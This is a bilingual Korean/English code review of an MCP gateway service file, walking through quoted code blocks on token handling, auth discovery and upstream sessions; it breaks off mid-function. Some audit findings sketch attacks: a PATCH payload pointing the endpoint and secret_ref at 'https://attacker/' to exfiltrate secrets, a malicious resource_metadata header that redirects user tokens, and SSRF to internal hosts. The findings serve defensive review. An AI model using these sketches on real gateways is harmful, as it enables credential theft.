> 리뷰 레벨: 2 — ~3년 주니어 인수인계 수준 · [← INDEX.md](../../INDEX.md) · 디렉터리 개요: [services_Abstract.md](services_Abstract.md)

### 18. app/services/mcp_gateway.py
**파일 요약 / File Summary**
- 역할 / Role: MCP 프록시 핵심. 클라이언트 MCP 세션 종료(terminate)·업스트림 세션 별도 관리, 대상 해석(단일·가상·전체 집계 `_all`), 전송별 호출(streamable-http legacy/modern(2026-07-28 MRTR), hosted-openapi, stdio), 업스트림 인증 주입(bearer/api_key 시크릿, RFC 8693 교환, 외부 AS), RFC 9728/8414 발견, 도구 목록 갱신·헬스, 거버넌스 판정·한도·승인·소독·사용량 기록.
- 진입점 거리 / Distance: 1 (`app/main.py:43,76` 지연 import) · 2 (`app/api/mcp.py` 경유)
- LOC: 1041 — `max_lines_per_file`(600) 초과 → **논리 블록 단위로 분석**(모든 블록 커버, 원문 전체 인용)
- 주요 export: `RpcError`, `ServerRef`, `RpcContext`, `upstream_token`, `discover_auth`, `call_server`, `refresh_tools`, `test_config`, `list_tools`, `call_tool`, `generic`, `tool_schema`, `load_targets`, `_load_targets`, `open_session`·`check_session`·`close_session`·`session_capabilities`, `clear_caches`, 오류 코드 상수
- 의존(내부): `app.core.{logs,metrics,security,auth,config,context,http,tracing,ids}`, `app.db`, `app.models`, `app.services.{audit,governance,guards,identity,mcp_modern,ratelimit,secrets,mcp_consent,tls,review}`
- 외부 패키지: httpx, httpx2(전이 의존), fastmcp(Client·StdioTransport·FastMCP.from_openapi), mcp.types, starlette(run_in_threadpool), opentelemetry
- 부수효과 / Side effects: 업스트림 HTTP·하위 프로세스(stdio), DB 읽기·쓰기(세션·사용량·결정 로그·도구 규칙·서버 상태), 프로세스 전역 캐시 `_TOKENS`·`_UPSTREAM_SESSIONS`·`_HOSTED`
- 동시성 / Concurrency: asyncio + 동기 DB 는 `run_in_threadpool` 로 분리(일관된 패턴), 전역 dict 캐시는 락 없음
- 테스트 커버리지 흔적: `test/test_mcp.py`, `test/test_mcp_consent.py`, `test/test_mcp_modern*.py`, `test/test_mtls.py`, `test/test_review.py`(test-config), `test/test_review_fixes.py`(토큰 캐시·egress)
- 참고: 리뷰 도중(14:00) 동시 작업으로 `_cache_token`(L89-95)과 hosted base_url egress 검사(L516-521)가 추가되었다 — 본 리뷰는 14:03 스냅샷 기준(INDEX §1.6).

## 블록 리뷰 / Block Walk (Level 2)

```python path=app/services/mcp_gateway.py lines=1-46
"""MCP Requests 프록시 (FR-G09·G00·G07·I02·I03, FR-A03 원격 경로, FR-S00).

게이트웨이는 클라이언트 MCP 세션을 직접 종료(terminate)하고, 업스트림 서버별 세션을 따로 관리한다.
- 대상: 단일 서버(/mcp/{id}) · 가상 서버(VirtualServer) · 전체 집계(/mcp/_all, 도구명 `{ns}.{tool}`)
- 전송: streamable-http(원격) · hosted-openapi(OpenAPI→도구, 게이트웨이 내부 호스팅) · stdio(허용 명령만)
- 인증: 업스트림이 OAuth 2.1 리소스 서버면 RFC 9728 PRM 으로 인가 서버를 발견하고, 내장 STS 면 RFC 8693 으로
  도구별 최소 스코프 토큰을 교환해 주입한다(사용자 신원 전파). 외부 AS 는 token-exchange 또는 서비스 계정.
- 세대: 업스트림이 MCP 2026-07-28 을 지원하면(server/discover 로 발견, 서버별 protocol=auto|legacy|2026-07-28)
  initialize·세션 없이 요청마다 `_meta`·헤더로 호출하고, InputRequiredResult 는 같은 중계·동의 경로로 답해 재시도한다(D14-②).
"""
import asyncio
import contextvars
import fnmatch
import json
import time
from dataclasses import dataclass, field
from urllib.parse import urlparse

import httpx
from sqlalchemy import select
from sqlalchemy.orm import Session
from starlette.concurrency import run_in_threadpool

from opentelemetry.trace import SpanKind

from app.core import logs, metrics, security
from app.core.auth import Principal
from app.core.config import MCP_PROTOCOL_VERSION, MCP_SUPPORTED_VERSIONS, settings
from app.core.context import current_trace_id
from app.core.http import async_client
from app.core.tracing import span
from app.core.ids import new_id, token_urlsafe
from app.db import SessionLocal, utcnow
from app.models import (AgentProfile, McpServer, McpSession, RoutingDecision, TokenExchangePolicy, ToolRule,
                        UsageRecord, VirtualServer)
from app.services import audit, governance, guards, identity, mcp_modern, ratelimit, secrets

GATEWAY_INFO = {"name": "agentnexus-gateway", "title": "AgentNexus AI Gateway", "version": "0.1.0"}
ALL = "_all"
TOOLS_TTL_S = 300
SYSTEM = Principal(sub="system:gateway", kind="workload", name="gateway", roles=["admin"])

# JSON-RPC 오류 코드
PARSE, INVALID_REQ, NOT_FOUND, INVALID_PARAMS, INTERNAL = -32700, -32600, -32601, -32602, -32603
APPROVAL_REQUIRED, UPSTREAM_ERROR, FORBIDDEN = -32001, -32002, -32003
RATE_LIMITED = -32005  # A2A 게이트웨이와 같은 코드, HTTP 429 + Retry-After
```
**분석 / Analysis (Level 2)**
- L1-10: 설계 요약 — 게이트웨이가 클라이언트 세션을 **직접 종료**하고 업스트림 세션은 따로 둔다(중개자가 세션을 투명 전달하지 않음). 인증은 업스트림이 OAuth 리소스 서버면 PRM 으로 AS 발견 후, 내장 STS 면 도구별 최소 스코프 토큰을 교환해 주입(사용자 신원 전파).
- L22 `run_in_threadpool`: 동기 SQLAlchemy 를 이벤트 루프 밖 스레드에서 실행 — 이 파일 전체의 기본 패턴.
- L38-41: 서버 정보, 집계 id `_all`, 도구 목록 캐시 TTL 300초, 시스템 호출용 주체 `SYSTEM`(roles=admin, kind=workload).
- L44-46: JSON-RPC 표준 오류 코드 + 확장 코드(-32001 승인 필요, -32002 업스트림 오류, -32003 금지, -32005 한도).
**짚어볼 점 / Watch-outs**
- L41 `SYSTEM` 은 admin 역할이지만 `kind="workload"` 이고 스코프가 없어 `has()` 가 항상 False(`app/core/auth.py:68-73` — 워크로드는 스코프 없으면 기본 거부). 권한 검사를 거치지 않는 내부 호출(`refresh_tools`)에만 쓰여 안전하지만, 이 주체를 `require` 로 보호되는 코드에 넘기면 예상과 다르게 거부된다.

```python path=app/services/mcp_gateway.py lines=49-82
class RpcError(Exception):
    def __init__(self, code: int, message: str, data: dict | None = None, http_status: int = 200):
        super().__init__(message)
        self.code, self.message, self.data, self.http_status = code, message, data or {}, http_status

    def body(self, rid) -> dict:
        err = {"code": self.code, "message": self.message}
        if self.data:
            err["data"] = self.data
        return {"jsonrpc": "2.0", "id": rid, "error": err}


@dataclass
class ServerRef:
    """DB 행의 분리 스냅샷 (비동기 구간에서 세션 없이 사용)."""
    id: str
    name: str
    transport: str
    endpoint: str | None
    command: list
    auth: dict
    tools: list
    status: str
    server_json: dict = field(default_factory=dict)
    tools_refreshed_at: float | None = None
    protocol: str = "auto"  # auto | legacy | 2026-07-28
    upstream_protocol: str | None = None

    @classmethod
    def of(cls, s: McpServer) -> "ServerRef":
        return cls(s.id, s.name, s.transport, s.endpoint, list(s.command or []), dict(s.auth or {}),
                   list(s.tools or []), s.status, dict(s.server_json or {}),
                   s.tools_refreshed_at.timestamp() if s.tools_refreshed_at else None,
                   s.protocol or "auto", s.upstream_protocol)
```
**분석 / Analysis (Level 2)**
- L49-58 `RpcError`: JSON-RPC 오류 + HTTP 상태(기본 200 — JSON-RPC 관례상 오류도 200). `body(rid)` 로 응답 봉투 생성.
- L61-82 `ServerRef`: DB 행의 **분리 스냅샷**(dataclass). 비동기 구간에서 세션 없이 쓰려고 리스트·dict 를 복사한다(L79-80 `list(...)`, `dict(...)`) — ORM 객체를 세션 밖으로 들고 다니는 detached 문제와 공유 가변 상태를 피한다.
**짚어볼 점 / Watch-outs**
- 복사는 얕은 복사다 — `auth["tls"]` 같은 중첩 dict 는 원본 ORM 값과 공유된다. 이 파일은 최상위 키만 바꾸므로(`srv.auth.update(...)`, `srv.auth = {...}`) 문제가 없지만 중첩 변경 시 주의.

```python path=app/services/mcp_gateway.py lines=85-121
# ───────────────────────── 업스트림 토큰 (MCP Authorization) ─────────────────────────
_TOKENS: dict[tuple, tuple[float, str]] = {}


def _cache_token(key: tuple, expires: float, token: str) -> None:
    if len(_TOKENS) >= 1024:  # 만료분 정리 — 한 번 왔다 다시 오지 않는 주체·대상 조합이 쌓이지 않게
        now = time.time()
        for k in [k for k, (exp, _) in _TOKENS.items() if exp <= now]:
            _TOKENS.pop(k, None)
    _TOKENS[key] = (expires, token)


def clear_caches() -> None:
    _TOKENS.clear()
    _UPSTREAM_SESSIONS.clear()
    _HOSTED.clear()


def _required_scopes(srv: ServerRef, tool: str | None) -> list[str] | None:
    scopes = (srv.auth.get("tool_scopes") or {})
    if tool and tool in scopes:
        return [scopes[tool]]
    return None  # 교환 정책의 default_scopes


def ensure_exchange_policy(db: Session, srv: McpServer) -> None:
    """등록 시 대상 audience 교환 정책 기본값 — 허용 스코프 = PRM scopes_supported ∪ 도구 스코프, 기본 = 읽기."""
    aud = f"mcp:{srv.id}"
    if db.scalars(select(TokenExchangePolicy).where(TokenExchangePolicy.audience == aud)).first():
        return
    tool_scopes = sorted(set((srv.auth or {}).get("tool_scopes", {}).values()))
    allowed = sorted(set(tool_scopes) | set((srv.auth or {}).get("scopes_supported") or []))
    default = [s for s in allowed if s.endswith(":read")] or allowed[:1]
    if not allowed:
        allowed = default = ["mcp:invoke"]
    db.add(TokenExchangePolicy(id=new_id("txp"), audience=aud, audience_type="mcp_server", allowed_scopes=allowed,
                               default_scopes=default, ttl_seconds=300))
```
**분석 / Analysis (Level 2)**
- L86 `_TOKENS`: (주체, audience, 스코프) → (만료 시각, 토큰) 캐시.
- L89-95 `_cache_token`: 1024 개 이상이면 만료분을 정리하고 저장 — 한 번 쓰고 다시 오지 않는 조합이 무한히 쌓이는 것을 막는다.
- L97-100 `clear_caches`: 서버 설정 변경 시 호출(`app/api/mcp.py:409`).
- L103-107 `_required_scopes`: 도구별 필요 스코프(서버 `auth.tool_scopes`) — 없으면 교환 정책 기본값.
- L110-121 `ensure_exchange_policy`: 등록 시 `mcp:{id}` audience 교환 정책 기본값 — 허용 = PRM 지원 스코프 ∪ 도구 스코프, 기본 = `:read` 스코프(최소 권한 기본값).
**짚어볼 점 / Watch-outs**
- L92 정리는 **만료된 항목만** — 만료 전 항목이 1024 개를 넘으면 매 저장마다 전체 순회(O(n))가 일어나고 계속 커진다(상한이 아니라 정리 트리거). 사용자 × 서버 × 스코프 조합이 많으면 메모리·CPU 가 늘어난다. LRU 상한이 더 확실하다.
- 캐시는 워커별 — 다중 워커에서 같은 사용자가 워커마다 토큰을 교환한다(기능상 문제 없음).

```python path=app/services/mcp_gateway.py lines=124-155
async def upstream_token(srv: ServerRef, p: Principal, scopes: list[str] | None) -> dict[str, str]:
    """업스트림 요청 인증 헤더."""
    auth = srv.auth or {}
    kind = auth.get("type", "none")
    if kind in ("none", "", None):
        return {}
    if kind in ("bearer", "api_key"):
        def _secret():
            with SessionLocal() as db:
                return secrets.get_plain(db, auth.get("secret_ref"))
        value = auth.get("_candidate_secret") or await run_in_threadpool(_secret)  # 적용 전 시험(F03)은 저장 안 한 후보 값
        if not value:
            raise RpcError(UPSTREAM_ERROR, f"{srv.id}: 백엔드 자격 증명이 설정되지 않았습니다.")
        return {"Authorization": f"Bearer {value}"} if kind == "bearer" else {auth.get("header", "X-API-Key"): value}
    aud = f"mcp:{srv.id}"
    key = (p.sub, aud, tuple(sorted(scopes or [])))
    hit = _TOKENS.get(key)
    if hit and hit[0] - 30 > time.time():
        return {"Authorization": f"Bearer {hit[1]}"}
    as_url = auth.get("authorization_server") or security.issuer()
    if as_url.rstrip("/") == security.issuer():
        def _exchange():
            with SessionLocal() as db:
                return identity.exchange(db, p, aud, scopes, actor="gateway")
        try:
            tok = await run_in_threadpool(_exchange)
        except Exception as exc:  # noqa: BLE001 — ApiError(token_exchange_failed)
            raise RpcError(FORBIDDEN, getattr(exc, "detail", str(exc)), {"code": "token_exchange_failed"}) from exc
    else:
        tok = await _external_token(srv, p, scopes)
    _cache_token(key, time.time() + int(tok.get("expires_in", 300)), tok["access_token"])
    return {"Authorization": f"Bearer {tok['access_token']}"}
```
**분석 / Analysis (Level 2)**
- L126-129: 인증 없음이면 헤더 없음.
- L130-137 bearer/api_key: 시크릿 저장소에서 `secret_ref` 로 평문을 꺼내 `Authorization: Bearer` 또는 지정 헤더로 주입. 적용 전 시험(F03)은 저장하지 않은 후보 값(`_candidate_secret`)을 쓴다.
- L138-142: 캐시 적중이면 재사용(만료 30초 전까지).
- L143-151: AS 가 플랫폼 자신이면 RFC 8693 교환(`identity.exchange`) — 사용자 신원 + 도구 최소 스코프 토큰.
- L152-153: 외부 AS 면 `_external_token`.
- L154-155: 캐시 저장 후 헤더 반환.
**짚어볼 점 / Watch-outs**
- [위험:높음 · 시크릿 유출] L133 `secrets.get_plain(db, auth.get("secret_ref"))` 의 `secret_ref` 는 서버 `auth` JSON 값이고, 이 JSON 은 `mcp:write` 권한(developer 역할 포함)만으로 관리 API 가 **요청 본문을 그대로 병합**한다(`app/api/mcp.py:400-401`). 엔드포인트도 같은 권한으로 바꿀 수 있다(`app/api/mcp.py:396-397`). 따라서 developer 가 `{"endpoint": "https://attacker/", "auth": {"type": "bearer", "secret_ref": "provider/openai/api_key"}}` 로 PATCH 후 `/refresh` 를 호출하면, L137 이 **다른 기능의 시크릿**(LLM 공급자 키·IdP client secret 등 — 이름은 `GET /api/v1/gateway/secrets`(gateway:read)로 조회 가능)을 공격자 서버에 Bearer 로 보낸다. 저장 없이 `test-config`(L700-706 후보 병합)로도 같은 일이 된다. `secret_ref` 는 서버 전용 네임스페이스(`mcp/{server_id}/…`)만 허용하고, endpoint 변경은 재승인을 요구해야 한다.
- L150-151 `except Exception` → RpcError 변환(삼킴 아님). 메시지에 `exc.detail` 을 실어 정책 사유를 클라이언트에 보여 준다(의도).

```python path=app/services/mcp_gateway.py lines=158-180
async def _external_token(srv: ServerRef, p: Principal, scopes: list[str] | None) -> dict:
    auth = srv.auth
    endpoint = auth.get("token_endpoint")
    if not endpoint:
        raise RpcError(UPSTREAM_ERROR, f"{srv.id}: 외부 인가 서버 token_endpoint 미발견")
    scope = " ".join(scopes or auth.get("scopes_supported") or [])
    if auth.get("mode", "exchange") == "service":
        def _sec():
            with SessionLocal() as db:
                return secrets.get_plain(db, auth.get("secret_ref"))
        secret = await run_in_threadpool(_sec)
        form = {"grant_type": "client_credentials", "client_id": auth.get("client_id", ""),
                "client_secret": secret or "", "scope": scope, "resource": srv.endpoint or ""}
    else:
        form = {"grant_type": identity.GRANT_TOKEN_EXCHANGE, "subject_token": p.raw_token or "",
                "subject_token_type": identity.TOKEN_TYPE_ACCESS, "resource": srv.endpoint or "", "scope": scope,
                "client_id": auth.get("client_id", "agentnexus-gateway")}
    async with async_client(timeout=10) as http:
        res = await http.post(endpoint, data=form)
    if res.status_code >= 400:
        raise RpcError(FORBIDDEN, f"{srv.id}: 외부 인가 서버 토큰 발급 실패 ({res.status_code})",
                       {"code": "token_exchange_failed"})
    return res.json()
```
**분석 / Analysis (Level 2)**
- L158-163: 외부 AS 의 `token_endpoint`(발견 결과)로 토큰 요청.
- L164-170 service 모드: 서비스 계정 client_credentials(서버 시크릿 사용).
- L171-174 exchange 모드(기본): RFC 8693 — **현재 사용자의 원본 토큰**(`p.raw_token`)을 `subject_token` 으로 보낸다.
- L175-180: 4xx/5xx 면 403 성격의 RpcError.
**짚어볼 점 / Watch-outs**
- [위험:높음 · 토큰 유출] L172 `subject_token=p.raw_token` — 사용자가 게이트웨이에 제시한 **플랫폼 액세스 토큰 또는 PAT(`anx_pat_`, 기본 90일)** 를 외부 AS 로 보낸다. 그 외부 AS 주소는 업스트림이 내려 준 메타데이터에서 온다(L200-234 발견, L388-399·L462-465 의 401 재발견). 즉 oauth2 로 등록된 업스트림이 401 + `WWW-Authenticate: resource_metadata="https://attacker/prm"` 을 돌려주면, 다음 시도에서 게이트웨이가 공격자 AS 의 `token_endpoint` 로 사용자의 원본 토큰을 POST 한다. 외부 AS 는 운영자가 명시 등록한 목록(허용 목록)만 쓰고, 원본 토큰 대신 audience 를 외부 AS 로 한정한 교환 토큰을 보내야 한다.
- L180 `res.json()` 이 JSON 이 아니면 `ValueError` 가 RpcError 로 감싸지지 않고 전파된다.

```python path=app/services/mcp_gateway.py lines=183-197
async def _tls(srv: ServerRef) -> dict:
    """업스트림 mTLS (FR-G02) — 서버 auth.tls + 게이트웨이 정책 → httpx 인자. 정책 위반은 호출 전에 거부."""
    from app.services import tls
    if tls.fast_none(srv.auth.get("tls")):
        return {}
    try:
        return tls.client_kwargs(await run_in_threadpool(tls.context_for, srv.auth.get("tls"), f"mcp:{srv.id}",
                                                         srv.endpoint or ""))
    except tls.MtlsError as exc:
        raise RpcError(FORBIDDEN, str(exc), {"code": "mtls_required", "server": srv.id}) from exc


def _prm_url(endpoint: str) -> str:
    u = urlparse(endpoint)
    return f"{u.scheme}://{u.netloc}/.well-known/oauth-protected-resource{u.path}"
```
**분석 / Analysis (Level 2)**
- L183-192 `_tls`: 서버 `auth.tls` + 게이트웨이 mTLS 정책 → httpx `verify`·`cert` 인자. 정책 위반(필수인데 없음)은 호출 전 403 `mtls_required`(fail closed). 인증서 로드는 파일 I/O 라 스레드풀.
- L195-197 `_prm_url`: RFC 9728 경로 규칙 — `{origin}/.well-known/oauth-protected-resource{path}`.

```python path=app/services/mcp_gateway.py lines=200-234
async def discover_auth(srv: ServerRef, challenge: str | None = None) -> dict:
    """RFC 9728 PRM → 인가 서버 → (외부면) RFC 8414 메타데이터. 결과는 server.auth 에 병합."""
    if not srv.endpoint:
        return {}
    url = None
    if challenge and "resource_metadata=" in challenge:
        url = challenge.split("resource_metadata=", 1)[1].split('"')[1] if '"' in challenge else None
    url = url or srv.auth.get("resource_metadata") or _prm_url(srv.endpoint)
    try:
        return await _discover(url, await _tls(srv))
    except (httpx.HTTPError, ValueError) as exc:
        raise RpcError(UPSTREAM_ERROR, f"{srv.id} 인증 메타데이터 조회 실패: {type(exc).__name__}",
                       {"server": srv.id}) from exc


async def _discover(url: str, tls_kw: dict | None = None) -> dict:
    out: dict = {}
    async with async_client(timeout=10, **(tls_kw or {})) as http:
        res = await http.get(url)
        if res.status_code != 200:
            return {}
        meta = res.json()
        out = {"type": "oauth2", "resource_metadata": url,
               "authorization_server": (meta.get("authorization_servers") or [security.issuer()])[0].rstrip("/"),
               "scopes_supported": meta.get("scopes_supported") or []}
        if out["authorization_server"] != security.issuer():
            as_meta = None
            for suffix in ("/.well-known/oauth-authorization-server", "/.well-known/openid-configuration"):
                r = await http.get(out["authorization_server"] + suffix)
                if r.status_code == 200:
                    as_meta = r.json()
                    break
            if as_meta:
                out["token_endpoint"] = as_meta.get("token_endpoint")
    return out
```
**분석 / Analysis (Level 2)**
- L200-212 `discover_auth`: 401 응답의 `WWW-Authenticate` 에서 `resource_metadata="…"` 를 꺼내거나(L205-206), 저장된 값, 아니면 규칙 경로. 네트워크·JSON 오류는 RpcError.
- L215-234 `_discover`: PRM 조회 → `authorization_servers[0]`(없으면 플랫폼 issuer) → 외부 AS 면 RFC 8414/OIDC 메타데이터에서 `token_endpoint`.
**짚어볼 점 / Watch-outs**
- [위험:중간 · SSRF] L206·L218·L228 업스트림이 준 URL 을 그대로 GET 한다. egress 가드(`app/core/http.py:34-106`)가 링크 로컬·메타데이터만 막으므로, 업스트림 응답 헤더 하나로 게이트웨이가 내부망(`http://valkey:6379/`, `http://api:8000/...`, 사설 대역 관리 콘솔)을 조회하게 할 수 있다. 응답 본문은 호출자에게 그대로 반환되지 않아 정보 유출은 제한적이지만(블라인드 SSRF), 위 L172 토큰 유출의 진입점이 된다.
- L206 `split('"')[1]` — 따옴표 없는 `resource_metadata=https://…` 표기(RFC 상 quoted-string 이 정상)는 무시된다.

```python path=app/services/mcp_gateway.py lines=237-262
# ───────────────────────── 업스트림 JSON-RPC (Streamable HTTP) ─────────────────────────
_UPSTREAM_SESSIONS: dict[tuple[str, str], tuple[str | None, str]] = {}


def _parse_rpc(res: httpx.Response, rid) -> dict:
    ctype = res.headers.get("content-type", "")
    if "text/event-stream" in ctype:
        for block in res.text.split("\n\n"):
            data = "".join(line[5:].strip() for line in block.splitlines() if line.startswith("data:"))
            if not data:
                continue
            msg = json.loads(data)
            if msg.get("id") == rid and ("result" in msg or "error" in msg):
                return msg
        raise RpcError(UPSTREAM_ERROR, "업스트림 SSE 응답에 결과가 없습니다.")
    return res.json()


async def _post(srv: ServerRef, body: dict, headers: dict) -> httpx.Response:
    hdr = {"Accept": "application/json, text/event-stream", "Content-Type": "application/json", **headers}
    tls_kw = await _tls(srv)
    try:
        async with async_client(timeout=settings.upstream_timeout, **tls_kw) as http:
            return await http.post(srv.endpoint, json=body, headers=hdr)
    except httpx.HTTPError as exc:
        raise RpcError(UPSTREAM_ERROR, f"{srv.id} 연결 실패: {type(exc).__name__}", {"server": srv.id}) from exc
```
**분석 / Analysis (Level 2)**
- L238 `_UPSTREAM_SESSIONS`: (서버, 주체) → (업스트림 세션 id, 협상 버전).
- L241-252 `_parse_rpc`: SSE 응답이면 `\n\n` 블록 → `data:` 줄을 합쳐 JSON, 요청 id 와 같은 결과/오류 메시지를 찾는다. 아니면 일반 JSON.
- L255-262 `_post`: 공통 헤더 + mTLS 로 POST, 연결 오류는 RpcError(`연결 실패: {예외 타입}` — 내부 주소를 노출하지 않음).
**짚어볼 점 / Watch-outs**
- L248 `json.loads(data)` 실패(`ValueError`)는 RpcError 로 감싸지 않는다 — 호출 경로에 따라 500 이 된다.

```python path=app/services/mcp_gateway.py lines=265-303
# 업스트림에 선언하는 클라이언트 능력 — 서버의 sampling·elicitation 요청은 mcp_consent 가 중계·동의로 처리 (SCR-C08)
UPSTREAM_CAPABILITIES = {"sampling": {}, "elicitation": {}}


async def _post_rpc(srv: ServerRef, body: dict, headers: dict, rid, ctx) -> tuple[httpx.Response, dict | None]:
    """요청을 보내고 SSE 응답을 흘려 읽는다 — 도중의 서버→클라이언트 요청(sampling·elicitation·roots·ping)에 답한다."""
    from app.services import mcp_consent
    hdr = {"Accept": "application/json, text/event-stream", "Content-Type": "application/json", **headers}
    # 동의(·검토) 대기 포함 — 사용자가 시간 연장(최대 10회, D14-③)을 해도 끊기지 않게
    wait = settings.upstream_timeout + 2 * settings.mcp_consent_timeout_s * (1 + governance.MAX_EXTENSIONS) + 30
    tls_kw = await _tls(srv)
    try:
        async with async_client(timeout=httpx.Timeout(settings.upstream_timeout, read=wait), **tls_kw) as http:
            async with http.stream("POST", srv.endpoint, json=body, headers=hdr) as res:
                if res.status_code >= 400:
                    await res.aread()
                    return res, None
                if "text/event-stream" not in res.headers.get("content-type", ""):
                    await res.aread()
                    return res, (res.json() if res.content else {})
                buf = ""
                async for chunk in res.aiter_text():
                    buf += chunk.replace("\r\n", "\n")
                    while "\n\n" in buf:
                        block, buf = buf.split("\n\n", 1)
                        data = "".join(line[5:].strip() for line in block.splitlines() if line.startswith("data:"))
                        if not data:
                            continue
                        msg = json.loads(data)
                        if "method" in msg and "id" in msg:  # 서버 → 클라이언트 요청
                            reply = await mcp_consent.handle(srv.id, ctx, msg)
                            await _post(srv, reply, headers)
                        elif msg.get("method") == "notifications/progress" and getattr(ctx, "progress", None):
                            await ctx.progress(msg.get("params") or {})  # 하류 요청의 progressToken 으로 다시 태그해 중계
                        elif msg.get("id") == rid and ("result" in msg or "error" in msg):
                            return res, msg
                raise RpcError(UPSTREAM_ERROR, "업스트림 SSE 응답에 결과가 없습니다.")
    except httpx.HTTPError as exc:
        raise RpcError(UPSTREAM_ERROR, f"{srv.id} 연결 실패: {type(exc).__name__}", {"server": srv.id}) from exc
```
**분석 / Analysis (Level 2)**
- L266: 업스트림에 선언하는 클라이언트 능력 — sampling·elicitation(실제 처리는 `mcp_consent`).
- L269-303 `_post_rpc`: 스트리밍으로 응답을 읽으며 **도중의 서버→클라이언트 요청**에 답한다(L294-296 `mcp_consent.handle` → 같은 세션 헤더로 `_post`). progress 알림은 하류로 중계(L297-298), 요청 id 의 결과가 오면 반환(L299-300).
- L274 읽기 타임아웃: `upstream_timeout + 2 × 동의 대기 × (1 + 최대 연장 10회) + 30` — 사용자가 동의를 10번 연장해도 끊기지 않게 계산한 값(설계 의도가 명확).
**짚어볼 점 / Watch-outs**
- [위험:낮음 · 자원] L285-289 `buf` 에 `\n\n` 이 오지 않는 한 무한히 쌓인다 — 악의적·고장 난 업스트림이 구분자 없는 바이트를 계속 보내면 메모리가 증가한다(최대 크기 제한 권장).
- L274 읽기 타임아웃이 최대 ~22분(기본값 기준) — 응답 없는 업스트림이 워커 연결을 오래 점유한다.
- L294 서버→클라이언트 요청 처리 중 `mcp_consent.handle` 이 ConsentError 외 예외를 던지면 업스트림은 응답을 받지 못한 채 대기한다(`app/services/mcp_consent.py:36-61` 리뷰 참조).

```python path=app/services/mcp_gateway.py lines=306-330
async def _ensure_upstream_session(srv: ServerRef, p: Principal, auth_hdr: dict) -> tuple[str | None, str]:
    key = (srv.id, p.sub)
    if key in _UPSTREAM_SESSIONS:
        return _UPSTREAM_SESSIONS[key]
    init = {"jsonrpc": "2.0", "id": 0, "method": "initialize",
            "params": {"protocolVersion": MCP_PROTOCOL_VERSION, "capabilities": UPSTREAM_CAPABILITIES,
                       "clientInfo": {"name": "agentnexus-gateway", "version": "0.1.0"}}}
    res = await _post(srv, init, auth_hdr)
    if res.status_code >= 400:
        raise RpcError(UPSTREAM_ERROR, f"{srv.id} initialize 실패 ({res.status_code})",
                       {"server": srv.id, "status": res.status_code}, http_status=res.status_code)
    msg = _parse_rpc(res, 0)
    version = (msg.get("result") or {}).get("protocolVersion", MCP_PROTOCOL_VERSION)
    sid = res.headers.get("mcp-session-id")
    hdr = {**auth_hdr, "MCP-Protocol-Version": version, **({"Mcp-Session-Id": sid} if sid else {})}
    await _post(srv, {"jsonrpc": "2.0", "method": "notifications/initialized"}, hdr)
    _UPSTREAM_SESSIONS[key] = (sid, version)

    def _store():
        with SessionLocal() as db:
            db.add(McpSession(id=new_id("ups"), kind="upstream", server_id=srv.id, principal_sub=p.sub,
                              upstream_session_id=sid, protocol_version=version))
            db.commit()
    await run_in_threadpool(_store)
    return sid, version
```
**분석 / Analysis (Level 2)**
- L306-330 `_ensure_upstream_session`: (서버, 주체) 별 업스트림 initialize → `notifications/initialized` → 세션 id·버전 캐시 + DB 기록(`McpSession kind=upstream`).
**짚어볼 점 / Watch-outs**
- [위험:낮음 · 경쟁] L307-309 확인-후-설정이 원자적이지 않다 — 같은 사용자의 동시 첫 호출 두 개가 모두 initialize 해 세션 2개가 생기고 마지막 것이 캐시에 남는다(업스트림에 고아 세션). `asyncio.Lock`(키별)으로 단일화 가능.
- L318 `msg.get("result")` — initialize 가 오류를 돌려주면 버전을 기본값으로 가정하고 진행한다.

```python path=app/services/mcp_gateway.py lines=333-368
def _progress_meta(ctx) -> dict:
    """하류가 progress 를 원하면(ctx.progress) 업스트림 요청에도 progressToken 을 단다."""
    return {"progressToken": new_id("prg")} if getattr(ctx, "progress", None) else {}


def _modern_upstream(srv: ServerRef) -> bool:
    if srv.transport != "streamable-http":
        return False
    return srv.protocol == "2026-07-28" or (srv.protocol in ("auto", None, "")
                                             and srv.upstream_protocol in mcp_modern.MODERN_VERSIONS)


def _save_protocol(server_id: str, version: str) -> None:
    with SessionLocal() as db:
        s = db.get(McpServer, server_id)
        if s is not None:
            s.upstream_protocol = version
            db.commit()


async def probe_protocol(srv: ServerRef, p: Principal) -> str:
    """server/discover 로 업스트림 세대 판별 — 2026-07-28 을 지원하면 modern, 아니면(오류·미지원) 레거시."""
    if srv.transport != "streamable-http" or not srv.endpoint or srv.protocol == "legacy":
        return MCP_PROTOCOL_VERSION
    try:
        auth_hdr = await upstream_token(srv, p, None)
        res = await _post(srv, {"jsonrpc": "2.0", "id": 0, "method": "server/discover",
                                "params": {"_meta": mcp_modern.request_meta({})}},
                          {**auth_hdr, **mcp_modern.request_headers("server/discover", {})})
        if res.status_code == 200:
            found = set((_parse_rpc(res, 0).get("result") or {}).get("supportedVersions") or [])
            if found & set(mcp_modern.MODERN_VERSIONS):
                return mcp_modern.MODERN_VERSIONS[0]
    except (RpcError, ValueError):
        pass
    return MCP_PROTOCOL_VERSION
```
**분석 / Analysis (Level 2)**
- L333-335: 하류가 progress 를 원하면 업스트림 요청에도 progressToken.
- L338-342 `_modern_upstream`: streamable-http 이고 서버 설정이 `2026-07-28` 이거나 `auto` + 발견된 버전이 modern 이면 modern 호출.
- L345-350: 발견한 업스트림 세대를 DB 에 저장.
- L353-368 `probe_protocol`: `server/discover` 로 세대 판별 — 실패·미지원이면 레거시.
**짚어볼 점 / Watch-outs**
- L366-367 `except (RpcError, ValueError): pass` — 조용한 삼킴이지만 "판별 실패 = 레거시" 라는 명시적 폴백이다. 원인 로그가 없어 왜 레거시로 동작하는지 운영자가 알기 어렵다.

```python path=app/services/mcp_gateway.py lines=371-437
class _LegacyOnly(Exception):
    """modern 요청에 UnsupportedProtocolVersion(-32022) — 레거시로 내려간다."""


MRTR_ROUNDS = 8


async def _modern_call(srv: ServerRef, p: Principal, method: str, params: dict | None, tool: str | None, ctx) -> dict:
    """modern 업스트림 — 요청마다 `_meta`(버전·능력)·헤더(Mcp-Method·Mcp-Name·Mcp-Param-*), 세션 없음.

    InputRequiredResult 면 inputRequests 를 레거시 서버 요청과 같은 mcp_consent.handle(중계·동의)로 답해
    inputResponses·requestState 로 다시 부른다(MRTR). 동의 거부·만료는 도구 오류 결과로 돌려준다(레거시와 같은 결과 모양)."""
    from app.services import mcp_consent
    scopes = _required_scopes(srv, tool) if method == "tools/call" else None
    schema = next((t.get("inputSchema") for t in srv.tools if t.get("name") == tool), None) if tool else None
    caps = UPSTREAM_CAPABILITIES if ctx is not None else {}
    params, reauth = dict(params or {}), True
    for rnd in range(MRTR_ROUNDS):
